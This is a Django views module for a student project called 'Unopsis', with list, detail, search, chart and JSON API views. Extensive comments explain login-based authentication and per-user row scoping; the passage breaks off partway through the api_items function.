"""
Views for Unopsis.

Part A -- the four view kinds (previous assignment). The same domain model (BriefItem, one
ranked card on a brief) shown four ways:

    1. item_list_manual   function-based view, loads the template by hand + HttpResponse
    2. item_list_render   function-based view, render() shortcut
    3. ItemListBaseView   class-based view, inherits from View and queries by hand
    4. ItemListView       class-based generic view (ListView), plus ItemDetailView (DetailView)

All four list views send the SAME context to the SAME template
(templates/unopsis/briefitem_list.html), so the template does not care how the data arrived.

Part B -- this assignment:

    home              (/)                     the home page, so the root URL is not a 404
    BriefListView     (/briefs/)              list of briefs, each linking to its detail page
    BriefDetailView   (/briefs/<pk>/)         detail by primary key, and a POST form that
                                              CREATES an item on that brief
    InsightsView      (/insights/)            ORM search: a GET form (shareable) and a POST
                                              form (deliberately not shareable), plus the
                                              aggregations
    lane_chart_png    (/insights/lanes.png)   matplotlib bar chart served as image/png
    provider_chart_png(/insights/providers.png) matplotlib pie chart served as image/png
    api_items         (/api/items/)           JSON API, function-based, filtered by ?params
    ItemsApiView      (/api/items/cbv/)       the same API as a class-based view
    api_insights      (/api/insights/)        JSON aggregations
    api_items_text    (/api/items.txt)        the SAME data through HttpResponse instead of
                                              JsonResponse, to show the MIME difference

ItemDetailView also gained a post() so one item's state and draft reply can be changed.

Assignment 5 -- authentication AND authorization. Nothing in this file was rewritten or
removed; what changed is who may call it, and whose rows they get back.

    AUTHENTICATION  every view below that returns something a person wrote carries
                    @login_required (function-based) or LoginRequiredMixin (class-based).
                    The login/signup/logout views live in unopsis/auth_views.py. Exactly one
                    endpoint stays open to everybody: api_items_by_lane.

    AUTHORIZATION   every queryset that reads a row somebody wrote goes through one of the
                    owned_*(user) helpers, so a signed-in account reads and writes its OWN
                    briefs and nothing else.

The two are separate answers to separate questions -- "is anybody there" and "is this yours"
-- and the second one is the one that is easy to skip, because skipping it has no symptom:
the site looks locked and every test about the lock passes. The two blocks under the imports
explain each half, and why LoginRequiredMixin has to be first in the base list.
"""

import csv
import io
import json
from datetime import date, timedelta
from pathlib import Path

import matplotlib

# Agg is the non-interactive backend: it draws into a memory buffer instead of opening a
# window. A web server has no display, so this line must run BEFORE pyplot is imported.
matplotlib.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402  (must follow matplotlib.use)
from matplotlib.ticker import MaxNLocator  # noqa: E402

import requests
import vl_convert

from django.contrib import messages as flash
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin
from django.db.models import Avg, Case, Count, IntegerField, Q, TextField, Value, When
from django.db.models.functions import Cast, TruncDate, TruncHour
from django.http import Http404, HttpResponse, JsonResponse
from django.shortcuts import redirect, render
from django.template import loader
from django.utils import timezone
from django.views import View
from django.views.generic import DetailView, ListView

from .forms import BriefItemCreateForm, ItemSearchForm, ItemUpdateForm, PrivateLookupForm
from .models import Brief, BriefItem, Connection, Message, Person, Provider, Space

# ======================================================================================
# ASSIGNMENT 5, PART 1 -- who may read what
# ======================================================================================
# Three lines of defence, and it is worth being explicit about which one does what, because
# the half-done version of this looks identical in review:
#
#   @login_required          on every function-based view below that reads real data
#   LoginRequiredMixin       on every class-based view, written FIRST in the base list
#   {% if user.is_authenticated %}  in templates/base.html and home.html, so the links and
#                            the figures are hidden too -- hiding a link is not security, but
#                            showing a logged-out stranger a headline is a leak even if the
#                            page behind the link would have turned them away.
#
# LoginRequiredMixin must come before the generic view in the bases
# (BriefDetailView(LoginRequiredMixin, DetailView), never the other way round). Python
# resolves dispatch() left to right, so a mixin listed second never runs: the class looks
# protected, reviews as protected, and serves the page to anybody. There is no error.
#
# Putting it on the CLASS rather than on get() is the other half of that. BriefDetailView and
# ItemDetailView both define post(), and those two POSTs -- create an item, rewrite an item's
# state and its draft reply -- were the only unauthenticated WRITES this project had. A
# decorator on get() alone would have left both of them open while making the pages look shut.
#
# EXACTLY ONE endpoint is deliberately left public, api_items_by_lane (see its docstring),
# plus home() and the three /accounts/ pages. Everything else that touches the database
# requires a session. The rule of thumb used to decide: if a response contains anything a
# person wrote -- a title, a summary, a message body, a display name, a handle -- it is
# private. Aggregate counts over those rows are not, and the public feed is counts only.
#
# A session is where this stops, though, and it is not where protection stops: see the second
# block, "who may read WHOSE rows", immediately below. Those three lines of defence all answer
# "is anybody there". None of them answers "is this yours".
#
# What an anonymous request to a protected JSON endpoint actually gets is a 302 to
# /accounts/login/?next=..., not a 401. That is Django's standard behaviour and it is what
# LOGIN_URL is for, but it means `curl` follows the redirect and prints an HTML login page
# with status 200, which reads at a glance like the endpoint is still open. It is not: the
# tests assert the 302 itself (follow=False), which is the honest check.


LIST_TEMPLATE = "unopsis/briefitem_list.html"

# BriefItem.lane is text, so ordering by it alphabetically would put "fyi" first and
# "needs_you" last. The product wants Needs-you first, so we rank the lanes explicitly here.
LANE_PRIORITY = Case(
    When(lane=BriefItem.Lane.NEEDS_YOU, then=Value(0)),
    When(lane=BriefItem.Lane.MOVING, then=Value(1)),
    default=Value(2),
    output_field=IntegerField(),
)


# ======================================================================================
# ASSIGNMENT 5, PART 1 (second half) -- who may read WHOSE rows
# ======================================================================================
# @login_required answers "is anybody there". It does not answer "is this yours", and those
# are different questions with the same-looking symptom when only the first one is asked: the
# site looks locked, every test about the lock passes, and every signed-in account still reads
# every other account's briefs, item titles, summaries, draft replies, contacts and message
# bodies. The sign-up page is public -- it has to be, the assignment asks for it -- so an
# authentication-only boundary stops a stranger for exactly one HTTP request: the one where
# they create an account.
#
# Space.user is the column that was always meant to carry this. Space's own docstring says it
# exists "to keep a user's work Slack from ever leaking into their personal brief"; until the
# helpers below existed, nothing honoured it. Every model in this project reaches a User
# through Space, so there is exactly one join to get right per model:
#
#     Space       .user
#     Connection  .space.user          Person   .space.user       Brief  .space.user
#     Message     .connection.space.user                          BriefItem .brief.space.user
#
# Those joins are written ONCE, here, rather than spelled out at each of the twenty-odd call
# sites. A missing .filter() does not raise, does not fail a test that only checks status
# codes, and does not look wrong in review -- so the defence has to be a function somebody
# would have to deliberately not call, not a line somebody could forget to type.
#
# AnonymousUser is handled by returning an EMPTY queryset rather than by raising. Only one
# view below is reachable logged out and also reads rows (home(), the front door), and an
# empty queryset lets that view keep a single code path: it still runs its query, the query
# still returns nothing, and the template's {% if user.is_authenticated %} is then a second
# independent reason the data is not on the page rather than the only one.
#
# NOT scoped, deliberately: items_by_lane_rows() and the public endpoint built on it. It
# answers site-wide counts with no row-level detail at all, which is precisely why it is the
# one feed that may be published. Its docstring says so at length.
def _no_one(model):
    """An empty queryset of `model`: what an anonymous request owns."""
    return model.objects.none()


def owned_spaces(user):
    """The Spaces `user` owns."""
    if not user.is_authenticated:
        return _no_one(Space)
    return Space.objects.filter(user=user)


def owned_briefs(user):
    """The Briefs `user` owns, through the Space they were generated for."""
    if not user.is_authenticated:
        return _no_one(Brief)
    return Brief.objects.filter(space__user=user)


def owned_items(user):
    """The BriefItems `user` owns: BriefItem -> Brief -> Space -> User, three hops."""
    if not user.is_authenticated:
        return _no_one(BriefItem)
    return BriefItem.objects.filter(brief__space__user=user)


def owned_messages(user):
    """The raw Messages `user` owns, through the Connection they arrived on."""
    if not user.is_authenticated:
        return _no_one(Message)
    return Message.objects.filter(connection__space__user=user)


def owned_people(user):
    """The People `user` owns. A display name and a handle are personal data twice over."""
    if not user.is_authenticated:
        return _no_one(Person)
    return Person.objects.filter(space__user=user)


def owned_connections(user):
    """The Connections `user` owns -- which mailbox and which chat account are linked."""
    if not user.is_authenticated:
        return _no_one(Connection)
    return Connection.objects.filter(space__user=user)


def filtered_items(request):
    """
    The one query every list view shares.

    Returns BriefItems with the work brief first, then Needs-you -> Moving -> FYI, then by the
    stored rank. Optional filters come from the query string: ?state=snoozed or ?lane=fyi.
    A filter that matches nothing is how we reach the empty state on the page.
    """
    items = (
        owned_items(request.user)
        .select_related("brief__space")
        .annotate(lane_priority=LANE_PRIORITY)
        .order_by("-brief__space__kind", "lane_priority", "rank")
    )
    state = request.GET.get("state")
    lane = request.GET.get("lane")
    if state:
        items = items.filter(state=state)
    if lane:
        items = items.filter(lane=lane)
    return items


def active_filters(request):
    """The filters currently applied, so the template can explain an empty list."""
    filters = {}
    for name in ("state", "lane"):
        if request.GET.get(name):
            filters[name] = request.GET[name]
    return filters


def list_context(request, view_label):
    """The context dictionary shared by views 1, 2 and 3 (view 4 builds the same keys itself)."""
    return {
        "items": filtered_items(request),
        "filters": active_filters(request),
        "view_label": view_label,
    }


# --------------------------------------------------------------------------------------
# 1. Function-based view, manual: load the template yourself, render it, wrap in HttpResponse
# --------------------------------------------------------------------------------------
@login_required
def item_list_manual(request):
    """
    Shows every stage of what Django normally hides:
      1. loader.get_template() finds the HTML file,
      2. template.render() fills it with the context,
      3. HttpResponse wraps the finished HTML for the browser.
    """
    template = loader.get_template(LIST_TEMPLATE)
    context = list_context(request, "Function-based view: HttpResponse (manual)")
    output = template.render(context, request)
    return HttpResponse(output)


# --------------------------------------------------------------------------------------
# 2. Function-based view, shortcut: render() does the three steps above in one call
# --------------------------------------------------------------------------------------
@login_required
def item_list_render(request):
    """Same page as view 1 with render(request, template, context): load + fill + wrap."""
    context = list_context(request, "Function-based view: render() shortcut")
    return render(request, LIST_TEMPLATE, context)


# --------------------------------------------------------------------------------------
# 3. Class-based view, base: inherit from View and write get() yourself
# --------------------------------------------------------------------------------------
class ItemListBaseView(LoginRequiredMixin, View):
    """
    The base View knows nothing about our model, so we query it ourselves inside get().
    (`model = BriefItem` would do nothing here. That is what the generic view adds.)
    """

    def get(self, request):
        context = list_context(request, "Class-based view: base View")
        return render(request, LIST_TEMPLATE, context)


# --------------------------------------------------------------------------------------
# 4. Class-based view, generic: ListView / DetailView do the querying and template lookup
# --------------------------------------------------------------------------------------
class ItemListView(LoginRequiredMixin, ListView):
    """
    model = BriefItem is enough for ListView to fetch rows and to find its template by
    convention: <app>/<model>_list.html  ->  unopsis/briefitem_list.html.
    We only override get_queryset (to reuse the Needs-you-first ordering and the filters) and
    name the context variable `items` so it matches the shared template.
    """

    model = BriefItem
    context_object_name = "items"

    def get_queryset(self):
        return filtered_items(self.request)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["filters"] = active_filters(self.request)
        context["view_label"] = "Class-based view: generic ListView"
        return context


class ItemDetailView(LoginRequiredMixin, DetailView):
    """
    One card in full, including its "receipts" (the messages it was built from).
    Default template by convention: unopsis/briefitem_detail.html, with the object as `item`.
    """

    model = BriefItem
    context_object_name = "item"

    def get_queryset(self):
        # owned_items() rather than BriefItem.objects: this queryset is what get_object() reads,
        # so scoping it here is what makes ANOTHER user's pk a 404 on the GET *and* on the
        # post() below, which resolves its target through the same call. Had only the GET been
        # scoped, the page would have 404'd while the write still landed -- silently.
        return owned_items(self.request.user).select_related(
            "brief__space", "primary_message"
        ).prefetch_related("messages__author", "messages__connection")

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # The bound form is put in the context on a failed POST (see post()); on a GET we
        # build it fresh from the row so the fields show what is currently stored.
        context.setdefault("form", ItemUpdateForm(instance=self.object))
        return context

    # ---- the CBV handling input: GET renders, POST writes -----------------------------
    def post(self, request, *args, **kwargs):
        """
        A DetailView is GET-only out of the box; adding post() is all it takes to make the
        same class handle input.

        This is the modifying half of the GET/POST split: it changes a row, so it must be
        POST (never a link), it must carry {% csrf_token %}, and it finishes with a redirect
        rather than a rendered page -- the Post/Redirect/Get pattern -- so that refreshing the
        result cannot submit the same change a second time.
        """
        self.object = self.get_object()
        form = ItemUpdateForm(request.POST, instance=self.object)
        if form.is_valid():
            item = form.save(commit=False)
            # Stamp the clock fields the form does not expose.
            if item.state == BriefItem.State.HANDLED and not item.handled_at:
                item.handled_at = timezone.now()
            if item.state != BriefItem.State.HANDLED:
                item.handled_at = None
            item.save()
            flash.success(request, f"Saved \u201c{item.title}\u201d as {item.get_state_display()}.")
            # get_absolute_url() again: the model knows where it lives, so the redirect
            # does not have to name a route.
            return redirect(item.get_absolute_url())
        context = self.get_context_data(object=self.object, form=form)
        return self.render_to_response(context)


# ======================================================================================
# PART B -- SECTION 1: the home page and the brief pages (URL linking and navigation)
# ======================================================================================
# A5 note: this view used to serve "/" and was deliberately left open, because it was the
# front door that carried the Log in and Sign up buttons. It now serves /under-the-hood/ --
# "/" is app_views.landing -- so it is no longer a front door, it is the course dashboard
# behind the product. Left open it rendered a page of zeros to a visitor, which looks like a
# broken deployment rather than a closed one, so it takes the decorator with everything else.
@login_required
def home(request):
    """
    The home page, wired to "" in unopsis/urls.py so the root address is a real page instead
    of Django's "page not found" list.

    Assignment 5: this is the ONE page that keeps real data in its context while staying
    reachable logged out, and it is deliberate. It is the front door -- the page that carries
    the Log in and Sign up buttons -- so putting @login_required on it would bounce a
    first-time visitor from / straight to /accounts/login/?next=/ and make the deployed site
    look broken before anyone had a chance to read what it is.

    The gate therefore lives in the template instead of on the view: unopsis/home.html wraps
    the briefs, the Needs-you titles and the row counts in {% if user.is_authenticated %} and
    shows a sign-in invitation in their place. The query below still runs for an anonymous
    visitor, which costs six counts and two small selects against SQLite and keeps this view
    a single, readable code path; what changes is that none of it reaches the page.

    It is also the shortest end-to-end demonstration of the flow the assignment asks for:

        models.py    Brief / BriefItem / Message define the data and get_absolute_url()
        urls.py      path("", views.home, name="home") gives that view an address and a name
        views.py     this function queries the models and builds a context dict
        templates/   unopsis/home.html renders the context and links onward with {% url %}
                     and {{ item.get_absolute_url }}
    """
    user = request.user
    briefs = (
        owned_briefs(user)
        .select_related("space", "space__user")
        .annotate(item_count=Count("items", distinct=True))
        .order_by("-window_end")
    )
    context = {
        "briefs": briefs[:4],
        # Needs-you items only, best rank first: the three things the product exists to say.
        "urgent_items": (
            owned_items(user)
            .filter(lane=BriefItem.Lane.NEEDS_YOU)
            .exclude(state=BriefItem.State.DISMISSED)
            .select_related("brief__space")
            .order_by("rank")[:3]
        ),
        # A LIST of (label, number) pairs rather than a dict: in a template, {{ totals.items }}
        # would look up the dict KEY "items" before it ever reached dict.items().
        #
        # These are the signed-in user's own row counts, not the site's. A visitor reading
        # "Messages 412" on a page that only ever shows them their own four is being told
        # something about other people's mailboxes, which is small but is still a fact about
        # somebody else -- and for an anonymous visitor every one of them is 0, because
        # owned_*() returns nothing. The template hides the whole block logged out anyway.
        "totals": [
            ("Spaces", owned_spaces(user).count()),
            ("Connections", owned_connections(user).count()),
            ("People", owned_people(user).count()),
            ("Messages", owned_messages(user).count()),
            ("Briefs", owned_briefs(user).count()),
            ("Brief items", owned_items(user).count()),
        ],
    }
    return render(request, "unopsis/home.html", context)


class BriefListView(LoginRequiredMixin, ListView):
    """
    Every brief, newest first, with the number of items on it computed in the database rather
    than by calling .items.count() once per row in the template.
    """

    model = Brief
    context_object_name = "briefs"
    template_name = "unopsis/brief_list.html"

    def get_queryset(self):
        return (
            owned_briefs(self.request.user)
            .select_related("space", "space__user")
            .annotate(
                item_count=Count("items", distinct=True),
                needs_you_count=Count(
                    "items", filter=Q(items__lane=BriefItem.Lane.NEEDS_YOU), distinct=True
                ),
            )
            .order_by("-window_end")
        )


class BriefDetailView(LoginRequiredMixin, DetailView):
    """
    One brief by primary key: /briefs/<int:pk>/.

    The pk in the URL is the whole point of the section -- DetailView reads it from the URL
    kwargs, fetches that row (404 if it does not exist), and the template links back out with
    {{ brief.get_absolute_url }} and {{ item.get_absolute_url }}.

    It also carries the CREATE form (Section 5): GET renders it empty, POST validates and
    saves a new BriefItem attached to this brief.
    """

    model = Brief
    context_object_name = "brief"
    template_name = "unopsis/brief_detail.html"

    def get_queryset(self):
        # Scoped for the same reason ItemDetailView's is: post() below creates a row on
        # self.get_object(), so this one queryset decides both who may read this brief and who
        # may write to it. Another user's pk is a 404 here, not a quiet insert into their brief.
        return (
            owned_briefs(self.request.user)
            .select_related("space", "space__user")
            .prefetch_related("items")
        )

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context.setdefault("create_form", BriefItemCreateForm(brief=self.object))
        context["items"] = (
            self.object.items.annotate(lane_priority=LANE_PRIORITY)
            .annotate(receipt_count=Count("messages"))
            .order_by("lane_priority", "rank")
        )
        return context

    def post(self, request, *args, **kwargs):
        """POST creates an item on this brief. The brief comes from the URL, not the form."""
        self.object = self.get_object()
        form = BriefItemCreateForm(request.POST, brief=self.object)
        if form.is_valid():
            item = form.save()
            flash.success(request, f"Added \u201c{item.title}\u201d to this brief.")
            return redirect(self.object.get_absolute_url())
        flash.error(request, "That item could not be added -- see the errors below.")
        return self.render_to_response(self.get_context_data(create_form=form))


# ======================================================================================
# PART B -- SECTION 2 + 5: ORM queries, the GET form, the POST form, and aggregations
# ======================================================================================
def search_items(cleaned, user):
    """
    Turn the cleaned GET form into one queryset, one Django field lookup at a time.

    `user` is not one of the search terms: it is the set this search runs INSIDE. Taking it as
    an argument rather than reading it off a request is what makes it impossible to call this
    helper without saying whose rows it may touch -- a search that silently spanned every
    account would look identical from the outside and return other people's item titles.

    Lookups used here, which is the list the assignment asks to see:

        __icontains   case-insensitive substring          title / summary / person name
        __exact       equality (the default lookup)       lane, state
        __lte         less than or equal                  rank
        __isnull      NULL or not                         deadline_at
        __in          membership in a list                lanes shown on the chart
        field__field  spanning a relationship with __     brief__space__kind,
                                                          messages__author__display_name

    Everything is chained onto ONE queryset, so Django sends a single SQL query with an AND
    of the conditions; nothing is evaluated until the template iterates it.
    """
    items = (
        owned_items(user)
        .select_related("brief__space")
        .annotate(lane_priority=LANE_PRIORITY)
        .order_by("-brief__space__kind", "lane_priority", "rank")
    )

    q = cleaned.get("q")
    if q:
        # Q objects let one search box cover three columns with OR.
        items = items.filter(
            Q(title__icontains=q) | Q(summary__icontains=q) | Q(why__icontains=q)
        )
    if cleaned.get("lane"):
        items = items.filter(lane__exact=cleaned["lane"])
    if cleaned.get("state"):
        items = items.filter(state__exact=cleaned["state"])
    if cleaned.get("space"):
        # Relationship spanning: BriefItem -> Brief -> Space, two hops with __.
        items = items.filter(brief__space__kind__exact=cleaned["space"])
    if cleaned.get("author"):
        # Spanning a many-to-many and then a foreign key: item -> messages -> author.
        # .distinct() because a join across a to-many relation repeats the item once per
        # matching message.
        items = items.filter(
            messages__author__display_name__icontains=cleaned["author"]
        ).distinct()
    if cleaned.get("max_rank"):
        items = items.filter(rank__lte=cleaned["max_rank"])
    if cleaned.get("due_only"):
        items = items.filter(deadline_at__isnull=False)
    return items


# Human-readable names for the stored codes ("needs_you" -> "Needs you"). Templates cannot
# index a dict by a variable, so the labels are attached to each aggregation row below.
LANE_LABELS = dict(BriefItem.Lane.choices)
STATE_LABELS = dict(BriefItem.State.choices)
SPACE_LABELS = dict(Space.Kind.choices)
PROVIDER_LABELS = dict(Provider.choices)


def label_rows(rows, key, labels):
    """Attach a display label to each GROUP BY row, so the template can just print it."""
    for row in rows:
        row["label"] = labels.get(row[key], row[key] or "Unknown")
    return rows


def aggregate_summaries(user):
    """
    The aggregation half of Section 2, over the rows `user` owns.

    * a TOTAL with .count() / .aggregate(), which collapses a queryset to one number, and
    * GROUPED summaries with .values(...).annotate(Count(...)), which is Django's GROUP BY:
      values() names the grouping columns, annotate() is the aggregate per group.
    """
    items = owned_items(user)
    briefs = owned_briefs(user)
    msgs = owned_messages(user)
    people = owned_people(user)
    return {
        # --- totals ---
        "total_items": items.count(),
        "total_messages": msgs.count(),
        "total_noise": msgs.filter(is_noise=True).count(),
        "total_briefs": briefs.count(),
        "avg_items_per_brief": (
            briefs.annotate(n=Count("items")).aggregate(avg=Avg("n"))["avg"] or 0
        ),
        # --- grouped: items per lane (GROUP BY lane) ---
        "by_lane": label_rows(
            list(
                items.values("lane")
                .annotate(total=Count("id"))
                .order_by("-total")
            ),
            "lane", LANE_LABELS,
        ),
        # --- grouped: items per space kind, spanning two relationships ---
        "by_space": label_rows(
            list(
                items.values("brief__space__kind")
                .annotate(total=Count("id"))
                .order_by("-total")
            ),
            "brief__space__kind", SPACE_LABELS,
        ),
        # --- grouped: messages per provider, spanning Message -> Connection ---
        "by_provider": label_rows(
            list(
                msgs.values("connection__provider")
                .annotate(total=Count("id"))
                .order_by("-total")
            ),
            "connection__provider", PROVIDER_LABELS,
        ),
        # --- grouped: who sends the most, and how much of it is cited in a brief ---
        "by_person": label_rows(
            list(
                people.values("display_name", "space__kind")
                .annotate(
                    sent=Count("messages", distinct=True),
                    cited=Count("messages__brief_items", distinct=True),
                )
                .filter(sent__gt=0)
                .order_by("-sent")[:6]
            ),
            "space__kind", SPACE_LABELS,
        ),
        # --- grouped: each brief with its item count and its receipt count ---
        "by_brief": list(
            briefs.select_related("space")
            .annotate(
                item_count=Count("items", distinct=True),
                receipt_count=Count("items__messages", distinct=True),
            )
            .order_by("-window_end")
        ),
    }


class InsightsView(LoginRequiredMixin, ListView):
    """
    The page that carries Sections 2 and 5 at once: a list, a GET search, a POST lookup and
    the aggregation summaries.

    Adapted CBV: ListView normally answers GET only. get_queryset() reads request.GET, and
    post() below handles request.POST on the same URL -- one class, two methods, two very
    different jobs.
    """

    model = BriefItem
    context_object_name = "items"
    template_name = "unopsis/insights.html"

    def get_queryset(self):
        """
        GET: the search that IS the link.

        The form is bound to request.GET, so /insights/?q=deadline&lane=needs_you can be
        bookmarked, shared, or reloaded and returns the same rows every time. Nothing here
        writes, so there is no harm in the browser re-issuing it.
        """
        self.search_form = ItemSearchForm(self.request.GET or None)
        user = self.request.user
        if self.request.GET and self.search_form.is_valid():
            return search_items(self.search_form.cleaned_data, user)
        return search_items({}, user)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["search_form"] = self.search_form
        context.setdefault("lookup_form", PrivateLookupForm())
        context.setdefault("lookup_results", None)
        context.setdefault("lookup_ran", False)
        context["summaries"] = aggregate_summaries(self.request.user)
        context["lane_labels"] = LANE_LABELS
        context["state_labels"] = STATE_LABELS
        context["space_labels"] = SPACE_LABELS
        context["provider_labels"] = PROVIDER_LABELS
        # Which GET parameters are actually in play, for the "showing N of M" line and the
        # {% empty %} explanation.
        context["active_filters"] = {
            key: value for key, value in self.request.GET.items() if value
        }
        return context

    def post(self, request, *args, **kwargs):
        """
        POST: the search that must NOT be a link.

        Looking somebody up by the handle they are reached on -- a mobile number, a personal
        address -- is still only a read, so it is not POST for safety of the database. It is
        POST so the query stays out of the URL: out of the address bar during a screen share,
        out of browser history, out of bookmarks, out of the server's access log, and out of
        any link a teammate could be sent. GET would turn "everything Mom sent me" into a
        shareable address, which is the opposite of what this product promises.

        The response is rendered, not redirected, precisely because there is no address that
        could carry the result.
        """
        form = PrivateLookupForm(request.POST)
        results = None
        if form.is_valid():
            handle = form.cleaned_data["handle"].strip()
            # Person.handles is a JSONField (a list). Cast it to text so a plain icontains
            # works on SQLite as well as on Postgres.
            # Scoped first, searched second. This form takes a mobile number or a personal
            # address and answers with a name, every item that cites them and ten of their
            # message bodies, so an unscoped version is not "a search that returns too much":
            # it is a directory lookup over every account on the site, driven by a string the
            # searcher already has. Narrowing the Person queryset is enough to narrow all
            # three results, because the items and the messages are both filtered by
            # author__in=people.
            user = request.user
            people = (
                owned_people(user)
                .annotate(handles_text=Cast("handles", TextField()))
                .filter(Q(handles_text__icontains=handle)
                        | Q(display_name__icontains=handle))
                .select_related("space")
                .annotate(message_count=Count("messages", distinct=True))
            )
            results = {
                "handle": handle,
                "people": list(people),
                # Items whose receipts cite a message written by one of those people.
                "items": list(
                    owned_items(user)
                    .filter(messages__author__in=people)
                    .select_related("brief__space")
                    .distinct()
                    .order_by("lane", "rank")
                ),
                "messages": list(
                    owned_messages(user)
                    .filter(author__in=people)
                    .select_related("author", "connection")
                    .order_by("-sent_at")[:10]
                ),
            }
        self.object_list = self.get_queryset()
        context = self.get_context_data(
            lookup_form=form, lookup_results=results, lookup_ran=True
        )
        return self.render_to_response(context)


# ======================================================================================
# PART B -- SECTION 4: matplotlib charts served straight off a URL
# ======================================================================================
def _png_response(figure):
    """
    Turn a matplotlib figure into an image/png HttpResponse without ever touching the disk.

    BytesIO is an in-memory file. savefig() writes the PNG into that buffer, .getvalue()
    hands the bytes to HttpResponse, and close(figure) releases the figure.

    Memory note: the whole image lives in RAM for the length of the request, so this is fine
    for a chart of a few dozen kilobytes and would be the wrong shape for anything large or
    slow. Those belong in a file or a cache, generated once and served as a static file --
    here the chart has to be live because the numbers come from the database on every request.
    Every figure is closed explicitly; matplotlib keeps a global registry of open figures, and
    a view that forgets to close them leaks memory one request at a time.
    """
    buffer = io.BytesIO()
    figure.savefig(buffer, format="png", dpi=110, bbox_inches="tight")
    plt.close(figure)
    png = buffer.getvalue()
    buffer.close()
    response = HttpResponse(png, content_type="image/png")
    response["Content-Length"] = str(len(png))
    # The data changes whenever a brief does, so the browser must not keep an old chart.
    response["Cache-Control"] = "no-store"
    return response


@login_required
def lane_chart_png(request):
    """
    Bar chart: how many brief items sit in each lane, split by work and personal space.

    Served directly on a URL (/insights/lanes.png) so a template can point an <img> at it,
    exactly like illinois.edu/sections/enrollment.png in the brief.
    """
    rows = (
        owned_items(request.user)
        .values("lane", "brief__space__kind")
        .annotate(total=Count("id"))
        .order_by("lane")
    )
    lanes = [BriefItem.Lane.NEEDS_YOU, BriefItem.Lane.MOVING, BriefItem.Lane.FYI]
    kinds = [Space.Kind.WORK, Space.Kind.PERSONAL]
    counts = {(row["lane"], row["brief__space__kind"]): row["total"] for row in rows}

    figure, axes = plt.subplots(figsize=(7, 4))
    width = 0.38
    positions = range(len(lanes))
    for offset, kind in zip((-width / 2, width / 2), kinds):
        bars = axes.bar(
            [p + offset for p in positions],
            [counts.get((lane, kind), 0) for lane in lanes],
            width=width,
            label=SPACE_LABELS[kind],
            color="#2f4858" if kind == Space.Kind.WORK else "#d98324",
        )
        axes.bar_label(bars, fmt="%d", padding=2, fontsize=9, color="#5d6b7a")
    # Counts are whole numbers, so the y axis must not offer 0.5 of an item.
    axes.yaxis.set_major_locator(MaxNLocator(integer=True))
    axes.set_title("Brief items by lane and space")
    axes.set_xlabel("Lane")
    axes.set_ylabel("Number of items")
    axes.set_xticks(list(positions), [LANE_LABELS[lane] for lane in lanes])
    axes.legend(title="Space")
    axes.spines[["top", "right"]].set_visible(False)
    axes.grid(axis="y", linestyle=":", alpha=0.4)
    axes.set_axisbelow(True)
    if not counts:
        axes.text(0.5, 0.5, "No items yet -- run seed_demo", ha="center",
                  transform=axes.transAxes, color="#888")
    return _png_response(figure)


@login_required
def provider_chart_png(request):
    """Pie chart: where the raw messages actually came from (Message -> Connection -> provider)."""
    rows = (
        owned_messages(request.user)
        .values("connection__provider")
        .annotate(total=Count("id"))
        .order_by("-total")
    )
    labels = [PROVIDER_LABELS.get(r["connection__provider"], r["connection__provider"])
              for r in rows]
    sizes = [r["total"] for r in rows]

    figure, axes = plt.subplots(figsize=(5.5, 4.5))
    if sizes:
        wedges, _texts, autotexts = axes.pie(
            sizes,
            autopct=lambda pct: f"{pct:.0f}%",
            startangle=110,
            colors=["#2f4858", "#33658a", "#86bbd8", "#d98324", "#c44536", "#758e4f"],
            wedgeprops={"edgecolor": "white", "linewidth": 1.5},
        )
        for text in autotexts:
            text.set_color("white")
            text.set_fontsize(9)
        axes.legend(wedges, [f"{label} ({size})" for label, size in zip(labels, sizes)],
                    title="Provider", loc="center left", bbox_to_anchor=(1, 0.5))
    else:
        axes.text(0.5, 0.5, "No messages yet -- run seed_demo", ha="center",
                  transform=axes.transAxes, color="#888")
        axes.set_axis_off()
    axes.set_title("Raw messages by provider")
    return _png_response(figure)


# ======================================================================================
# PART B -- SECTION 6: the JSON API
# ======================================================================================
def serialize_item(item):
    """
    One BriefItem as plain JSON-safe data.

    Written by hand rather than dumped from the model, because an API is a promise about a
    shape: `raw` provider payloads, draft replies and token references are deliberately not in
    it. What leaves the server is the ranked, public-facing read of a brief -- never the
    private message bodies behind it.
    """
    return {
        "id": item.pk,
        "title": item.title,
        "lane": item.lane,
        "lane_label": item.get_lane_display(),
        "rank": item.rank,
        "state": item.state,
        "summary": item.summary,
        "space": item.brief.space.kind,
        "brief_id": item.brief_id,
        "deadline_at": item.deadline_at.isoformat() if item.deadline_at else None,
        "receipt_count": getattr(item, "receipt_count", None),
        "url": item.get_absolute_url(),
    }


def api_item_queryset(params, user):
    """
    The API's filtering, driven entirely by query parameters, over the rows `user` owns.

        /api/items/?lane=needs_you
        /api/items/?space=personal&state=open
        /api/items/?q=deadline&limit=3

    Unknown parameters are ignored rather than rejected, so a client can add one without the
    endpoint breaking.
    """
    items = (
        owned_items(user)
        .select_related("brief__space")
        .annotate(receipt_count=Count("messages"))
        .annotate(lane_priority=LANE_PRIORITY)
        .order_by("lane_priority", "rank")
    )
    if params.get("lane"):
        items = items.filter(lane__exact=params["lane"])
    if params.get("state"):
        items = items.filter(state__exact=params["state"])
    if params.get("space"):
        items = items.filter(brief__space__kind__exact=params["space"])
    if params.get("brief"):
        # A pk straight off the query string, and safe precisely because it is applied to the
        # already-scoped queryset above: ?brief=<somebody else's id> intersects to nothing and
        # returns {"count": 0}, rather than being an id-guessing read of their brief.
        items = items.filter(brief_id=params["brief"])
    if params.get("q"):
        items = items.filter(
            Q(title__icontains=params["q"]) | Q(summary__icontains=params["q"])
        )
    if params.get("due_before"):
        items = items.filter(deadline_at__lte=params["due_before"])
    return items


@login_required
def api_items(request):
    """
    FUNCTION-BASED JSON API.

    JsonResponse serializes the dict and, crucially, sets Content-Type: application/json, so
    a browser or `fetch()` treats the body as data rather than as a document to display.
    A list is wrapped in an object ({"count": .., "results": [..]}) rather than returned bare,
    which leaves room to add paging later without breaking existing clients.
    """
    items = api_item_queryset(request.GET, request.user)
    try:
        limit = min(int(request.GET.get("limit", 50)), 200)
    except ValueError:
        return JsonResponse({"error": "limit must be a whole number"}, status=400)

    payload = {
        "count": items.count(),
